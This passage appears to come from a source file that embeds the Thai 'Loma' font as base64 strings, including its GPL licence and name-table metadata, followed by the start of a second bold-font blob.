ub3BlbnRsZS5vcmcAAGgAdAB0AHAAOgAvAC8AdwB3AHcALgBvAHAAZQBuAHQAbABlAC4AbwByAGcAAGh0dHA6Ly93d3cub3BlbnRsZS5vcmcAAFQAaABpAHMAIABmAG8AbgB0ACAAaQBzACAAZgByAGUAZQAgAHMAbwBmAHQAdwBhAHIAZQA7ACAAeQBvAHUAIABjAGEAbgAgAHIAZQBkAGkAcwB0AHIAaQBiAHUAdABlACAAaQB0ACAAYQBuAGQALwBvAHIAIABtAG8AZABpAGYAeQAgAGkAdAAgAHUAbgBkAGUAcgAgAHQAaABlACAAdABlAHIAbQBzACAAbwBmACAAdABoAGUAIABHAE4AVQAgAEcAZQBuAGUAcgBhAGwAIABQAHUAYgBsAGkAYwAgAEwAaQBjAGUAbgBzAGUAIABhAHMAIABwAHUAYgBsAGkAcwBoAGUAZAAgAGIAeQAgAHQAaABlACAARgByAGUAZQAgAFMAbwBmAHQAdwBhAHIAZQAgAEYAbwB1AG4AZABhAHQAaQBvAG4AOwAgAGUAaQB0AGgAZQByACAAdgBlAHIAcwBpAG8AbgAgADIAIABvAGYAIAB0AGgAZQAgAEwAaQBjAGUAbgBzAGUALAAgAG8AcgAgACgAYQB0ACAAeQBvAHUAcgAgAG8AcAB0AGkAbwBuACkAIABhAG4AeQAgAGwAYQB0AGUAcgAgAHYAZQByAHMAaQBvAG4ALgAKAAoAVABoAGkAcwAgAGYAbwBuAHQAIABpAHMAIABkAGkAcwB0AHIAaQBiAHUAdABlAGQAIABpAG4AIAB0AGgAZQAgAGgAbwBwAGUAIAB0AGgAYQB0ACAAaQB0ACAAdwBpAGwAbAAgAGIAZQAgAHUAcwBlAGYAdQBsACwAIABiAHUAdAAgAFcASQBUAEgATwBVAFQAIABBAE4AWQAgAFcAQQBSAFIAQQBOAFQAWQA7ACAAdwBpAHQAaABvAHUAdAAgAGUAdgBlAG4AIAB0AGgAZQAgAGkAbQBwAGwAaQBlAGQAIAB3AGEAcgByAGEAbgB0AHkAIABvAGYAIABNAEUAUgBDAEgAQQBOAFQAQQBCAEkATABJAFQAWQAgAG8AcgAgAEYASQBUAE4ARQBTAFMAIABGAE8AUgAgAEEAIABQAEEAUgBUAEkAQwBVAEwAQQBSACAAUABVAFIAUABPAFMARQAuACAAIABTAGUAZQAgAHQAaABlACAARwBOAFUAIABHAGUAbgBlAHIAYQBsACAAUAB1AGIAbABpAGMAIABMAGkAYwBlAG4AcwBlACAAZgBvAHIAIABtAG8AcgBlACAAZABlAHQAYQBpAGwAcwAuAAoACgBZAG8AdQAgAHMAaABvAHUAbABkACAAaABhAHYAZQAgAHIAZQBjAGUAaQB2AGUAZAAgAGEAIABjAG8AcAB5ACAAbwBmACAAdABoAGUAIABHAE4AVQAgAEcAZQBuAGUAcgBhAGwAIABQAHUAYgBsAGkAYwAgAEwAaQBjAGUAbgBzAGUAIABhAGwAbwBuAGcAIAB3AGkAdABoACAAdABoAGkAcwAgAGYAbwBuAHQAOwAgAGkAZgAgAG4AbwB0ACwAIAB3AHIAaQB0AGUAIAB0AG8AIAB0AGgAZQAgAEYAcgBlAGUAIABTAG8AZgB0AHcAYQByAGUAIABGAG8AdQBuAGQAYQB0AGkAbwBuACwAIABJAG4AYwAuACwAIAA1ADEAIABGAHIAYQBuAGsAbABpAG4AIABTAHQALAAgAEYAaQBmAHQAaAAgAEYAbABvAG8AcgAsACAAQgBvAHMAdABvAG4ALAAgAE0AQQAgACAAMAAyADEAMQAwAC0AMQAzADAAMQAgACAAVQBTAEEACgAKAEEAcwAgAGEAIABzAHAAZQBjAGkAYQBsACAAZQB4AGMAZQBwAHQAaQBvAG4ALAAgAGkAZgAgAHkAbwB1ACAAYwByAGUAYQB0AGUAIABhACAAZABvAGMAdQBtAGUAbgB0ACAAdwBoAGkAYwBoACAAdQBzAGUAcwAgAHQAaABpAHMAIABmAG8AbgB0ACwAIABhAG4AZAAgAGUAbQBiAGUAZAAgAHQAaABpAHMAIABmAG8AbgB0ACAAbwByACAAdQBuAGEAbAB0AGUAcgBlAGQAIABwAG8AcgB0AGkAbwBuAHMAIABvAGYAIAB0AGgAaQBzACAAZgBvAG4AdAAgAGkAbgB0AG8AIAB0AGgAZQAgAGQAbwBjAHUAbQBlAG4AdAAsACAAdABoAGkAcwAgAGYAbwBuAHQAIABkAG8AZQBzACAAbgBvAHQAIABiAHkAIABpAHQAcwBlAGwAZgAgAGMAYQB1AHMAZQAgAHQAaABlACAAcgBlAHMAdQBsAHQAaQBuAGcAIABkAG8AYwB1AG0AZQBuAHQAIAB0AG8AIABiAGUAIABjAG8AdgBlAHIAZQBkACAAYgB5ACAAdABoAGUAIABHAE4AVQAgAEcAZQBuAGUAcgBhAGwAIABQAHUAYgBsAGkAYwAgAEwAaQBjAGUAbgBzAGUALgAgAFQAaABpAHMAIABlAHgAYwBlAHAAdABpAG8AbgAgAGQAbwBlAHMAIABuAG8AdAAgAGgAbwB3AGUAdgBlAHIAIABpAG4AdgBhAGwAaQBkAGEAdABlACAAYQBuAHkAIABvAHQAaABlAHIAIAByAGUAYQBzAG8AbgBzACAAdwBoAHkAIAB0AGgAZQAgAGQAbwBjAHUAbQBlAG4AdAAgAG0AaQBnAGgAdAAgAGIAZQAgAGMAbwB2AGUAcgBlAGQAIABiAHkAIAB0AGgAZQAgAEcATgBVACAARwBlAG4AZQByAGEAbAAgAFAAdQBiAGwAaQBjACAATABpAGMAZQBuAHMAZQAuACAASQBmACAAeQBvAHUAIABtAG8AZABpAGYAeQAgAHQAaABpAHMAIABmAG8AbgB0ACwAIAB5AG8AdQAgAG0AYQB5ACAAZQB4AHQAZQBuAGQAIAB0AGgAaQBzACAAZQB4AGMAZQBwAHQAaQBvAG4AIAB0AG8AIAB5AG8AdQByACAAdgBlAHIAcwBpAG8AbgAgAG8AZgAgAHQAaABlACAAZgBvAG4AdAAsACAAYgB1AHQAIAB5AG8AdQAgAGEAcgBlACAAbgBvAHQAIABvAGIAbABpAGcAYQB0AGUAZAAgAHQAbwAgAGQAbwAgAHMAbwAuACAASQBmACAAeQBvAHUAIABkAG8AIABuAG8AdAAgAHcAaQBzAGgAIAB0AG8AIABkAG8AIABzAG8ALAAgAGQAZQBsAGUAdABlACAAdABoAGkAcwAgAGUAeABjAGUAcAB0AGkAbwBuACAAcwB0AGEAdABlAG0AZQBuAHQAIABmAHIAbwBtACAAeQBvAHUAcgAgAHYAZQByAHMAaQBvAG4ALgAAVGhpcyBmb250IGlzIGZyZWUgc29mdHdhcmU7IHlvdSBjYW4gcmVkaXN0cmlidXRlIGl0IGFuZC9vciBtb2RpZnkgaXQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBhcyBwdWJsaXNoZWQgYnkgdGhlIEZyZWUgU29mdHdhcmUgRm91bmRhdGlvbjsgZWl0aGVyIHZlcnNpb24gMiBvZiB0aGUgTGljZW5zZSwgb3IgKGF0IHlvdXIgb3B0aW9uKSBhbnkgbGF0ZXIgdmVyc2lvbi4KClRoaXMgZm9udCBpcyBkaXN0cmlidXRlZCBpbiB0aGUgaG9wZSB0aGF0IGl0IHdpbGwgYmUgdXNlZnVsLCBidXQgV0lUSE9VVCBBTlkgV0FSUkFOVFk7IHdpdGhvdXQgZXZlbiB0aGUgaW1wbGllZCB3YXJyYW50eSBvZiBNRVJDSEFOVEFCSUxJVFkgb3IgRklUTkVTUyBGT1IgQSBQQVJUSUNVTEFSIFBVUlBPU0UuICBTZWUgdGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGZvciBtb3JlIGRldGFpbHMuCgpZb3Ugc2hvdWxkIGhhdmUgcmVjZWl2ZWQgYSBjb3B5IG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBhbG9uZyB3aXRoIHRoaXMgZm9udDsgaWYgbm90LCB3cml0ZSB0byB0aGUgRnJlZSBTb2Z0d2FyZSBGb3VuZGF0aW9uLCBJbmMuLCA1MSBGcmFua2xpbiBTdCwgRmlmdGggRmxvb3IsIEJvc3RvbiwgTUEgIDAyMTEwLTEzMDEgIFVTQQoKQXMgYSBzcGVjaWFsIGV4Y2VwdGlvbiwgaWYgeW91IGNyZWF0ZSBhIGRvY3VtZW50IHdoaWNoIHVzZXMgdGhpcyBmb250LCBhbmQgZW1iZWQgdGhpcyBmb250IG9yIHVuYWx0ZXJlZCBwb3J0aW9ucyBvZiB0aGlzIGZvbnQgaW50byB0aGUgZG9jdW1lbnQsIHRoaXMgZm9udCBkb2VzIG5vdCBieSBpdHNlbGYgY2F1c2UgdGhlIHJlc3VsdGluZyBkb2N1bWVudCB0byBiZSBjb3ZlcmVkIGJ5IHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZS4gVGhpcyBleGNlcHRpb24gZG9lcyBub3QgaG93ZXZlciBpbnZhbGlkYXRlIGFueSBvdGhlciByZWFzb25zIHdoeSB0aGUgZG9jdW1lbnQgbWlnaHQgYmUgY292ZXJlZCB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CAAAALQABAC0AAAACAQYAAAACAAAALgABAC4AAQAIAAEADgABAAEAzAAGAA4AIAAyAEQAVgBoAAAAAgEPAAAAAgAAAC8AAQAvAAAAAgEQAAAAAgAAADAAAQAwAAAAAgERAAAAAgAAADEAAQAxAAAAAgESAAAAAgAAADIAAQAyAAAAAgETAAAAAgAAADMAAQAzAAAAAgEUAAAAAgAAADQAAQA0AAEACgACABIAKAABAAIBBAEFAAEABAAAAAIBBgAAAAIAAAAqAAEAKgABAAQAAAACAQYAAAACAAAAKwABACsAAQAMAAMAFgCQAQoAAQADAQQBBQEGAAYADgAgADIARABWAGgAAAACARAAAAACAAAAEwABABMAAAACAREAAAACAAAAFAABABQAAAACARIAAAACAAAAFQABABUAAAACARMAAAACAAAAFgABABYAAAACARQAAAACAAAAFwABABcAAAACARUAAAACAAAAGAABABgABgAOACAAMgBEAFYAaAAAAAIBEAAAAAIAAAAZAAEAGQAAAAIBEQAAAAIAAAAaAAEAGgAAAAIBEgAAAAIAAAAbAAEAGwAAAAIBEwAAAAIAAAAcAAEAHAAAAAIBFAAAAAIAAAAdAAEAHQAAAAIBFQAAAAIAAAAeAAEAHgAHABAAIgA0AEYAWABqAHwAAAACAQ8AAAACAAAAHwABAB8AAAACARAAAAACAAAAIAABACAAAAACAREAAAACAAAAIQABACEAAAACARIAAAACAAAAIgABACIAAAACARMAAAACAAAAIwABACMAAAACARQAAAACAAAAJAABACQAAAACARUAAAACAAAAJQABACUAAgAaACoAKgB2AAcAAAAAAH4AkAAAALgAAAACAAIA/wD/AAABDwEWAAEAAgAMAMsAywAEAM0A+gABAP0A/QAEAP8A/wACAQABAwAEAQ8BDwAFARABFAADARUBFgAFAUUBRgABAVABVAAGAVUBVQABAWQBZgAGAAEAAAABAAAAAQAEAAEAAQABAAAAAQAAAA4AAgAGABoAAQABAAIAAgAAAAIAAAAPAAEAEAABAAEAAQAAAAEAAAARAAQACgAYACYANAABAAQAAQAAAAEAAAASAAEAAwABAAAAAQAAABIAAQAFAAEAAAABAAAAEgABAAYAAQAAAAEAAAASAAEACAABAA4AAQABAQYABwAQACIANABGAFgAagB8AAAAAgEPAAAAAgAAAB8AAQAfAAAAAgFQAAAAAgAAACAAAQAgAAAAAgFRAAAAAgAAACEAAQAhAAAAAgFSAAAAAgAAACIAAQAiAAAAAgFTAAAAAgAAACMAAQAjAAAAAgFUAAAAAgAAACQAAQAkAAAAAgEVAAAAAgAAACUAAQAlAAEADAADABYALABCAAEAAwEEAQUBBgABAAQAAAACAMwAAAACAAAALAABACwAAQAEAAAAAgDMAAAAAgAAAC0AAQAtAAEABAAAAAIAzAAAAAIAAAAuAAEALgACAAoAAgFVAUYAAQACANkA3AABAA4AAQAIAAIBFQD+AAEAAQD/AAEALgAFABAAFgAcACIAKAACARUBEAACARUBEQACARUBEgACARUBEwACARUBFAACAAEBEAEUAAAAAQAG//8AAQABAP8AAQAGAEAAAgABARABFAAAAAIADAADAWUBZAFmAAEAAwEPARUBFgACAAoAAgFQAQQAAQACAQQBEAACAAoAAgFRAQQAAQACAQQBEQACAAoAAgFSAQQAAQACAQQBEgACAAoAAgFTAQQAAQACAQQBEwACAAoAAgFUAQQAAQACAQQBFAACAAoAAgEVAQQAAQACAQQBFQACAAoAAgFQAQUAAQACAQUBEAACAAoAAgFRAQUAAQACAQUBEQACAAoAAgFSAQUAAQACAQUBEgACAAoAAgFTAQUAAQACAQUBEwACAAoAAgFUAQUAAQACAQUBFAACAAoAAgEVAQUAAQACAQUBFQACAAoAAgEPAQYAAQACAQYBDwACAAwAAwFQAQYBBgABAAMBBgEQAVAAAgAMAAMBUQEGAQYAAQADAQYBEQFRAAIADAADAVIBBgEGAAEAAwEGARIBUgACAAwAAwFTAQYBBgABAAMBBgETAVMAAgAMAAMBVAEGAQYAAQADAQYBFAFUAAIACgACARUBBgABAAIBBgEVAAIACgACARAAywABAAIAywEQAAIACgACAREAywABAAIAywERAAIACgACARIAywABAAIAywESAAIACgACARMAywABAAIAywETAAIACgACAQYBBAABAAIBBAEGAAIACgACAQYBBQABAAIBBQEGAAIACgACAQQAzAABAAIAzAEEAAIACgACAQUAzAABAAIAzAEFAAIACgACAQYAzAABAAIAzAEGAAIACgACAQ8AzAABAAIAzAEPAAIACgACARAAzAABAAIAzAEQAAIACgACAREAzAABAAIAzAERAAIACgACARIAzAABAAIAzAESAAIACgACARMAzAABAAIAzAETAAIACgACARQAzAABAAIAzAEU"
_EMBEDDED_FONT_BOLD_B64 = "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AAD9PAbRAKsAAPuFAAD8ogAA+3MAAP1zAAD8XQAA/EkAAP0OAAD9HAAA/fMAAPyvAAD+hAPoANcCvABhAyAAtgAA/l0AAPwTAAD9zgQAABMEAAATBAAAEwY5ABMGOQATA+gAkQbRAKsFeAB/BUYAjQAAAAMAAAADAAAAHAABAAAAAAE0AAMAAQAAABwABAEYAAAAQgBAAAUAAgANAH4A/wExAVMCNwK8AscC1wLaAtwDAwMxDjoOWyADIBAgFSAeICIgJiAwIDMgOiA8ID4gRCB/ISIlzPcg+wT//wAAAA0AIACgATEBUgI3ArwCxgLXAtoC3AMDAzEOAQ4/IAIgCyATIBcgICAmIDAgMiA5IDwgPiBEIH8hIiXM9wD7AP////T/4v/B/5D/cP6N/gn+AP3x/e/97v3I/ZvyzPLI4SLhG+EZ4RjhF+EU4QvhCuEF4QThA+D+4MTgItt5CkYGZwABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYCCgAAAAABAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgADAAQABQAGAAcACAAJAAoACwAMAA0ADgAPABAAEQASABMAFAAVABYAFwAYABkAGgAbABwAHQAeAB8AIAAhACIAIwAkACUAJgAnACgAKQAqACsALAAtAC4ALwAwADEAMgAzADQANQA2ADcAOAA5ADoAOwA8AD0APgA/AEAAQQBCAEMARABFAEYARwBIAEkASgBLAEwATQBOAE8AUABRAFIAUwBUAFUAVgBXAFgAWQBaAFsAXABdAF4AXwBgAAAAhQCGAIgAigCSAJcAnQCiAKEAowClAKQApgCoAKoAqQCrAKwArgCtAK8AsACyALQAswC1ALcAtgC7ALoAvAC9ATcAcQBjAGQAaAE5AHcAoABvAGoBRAB1AGkAAACHAJkAAAByAAAAAABmAHYAAAAAAAAAAAAAAGsAewAAAKcAuQCAAGIAbQAAAAAAAAAAAGwAfAE6AGEAgQCEAJYAwgDDASwBLQE0ATUBMAExALgAAADAAAABQgAAAT4BPwFoAWkBOAB4ATIBNgE7AIMAiwCCAIwAiQCOAI8AkACNAJQAlQAAAJMAmwCcAJoAwQDGAMoAcAAAAAAAyQB5AAAAAADHAAAAAAAVABUAFQArAEQAegDFARUBcgGDAaYByAIBAhkCMgI/AksCWgKKAqEC0QMTAzADZQOkA8gEFARYBGoEhQSZBK0EwwT8BYgFpQXkBhcGQQZYBm0GqgbBBtcG+QcWByUHQgdYB44HtwgZCEkIkgikCMQI2gj7CRwJNQlLCV0JbAl+CZIJnwmtCfgKLQpeCpUKywrwCzcLXQtwC44Lqgu2C/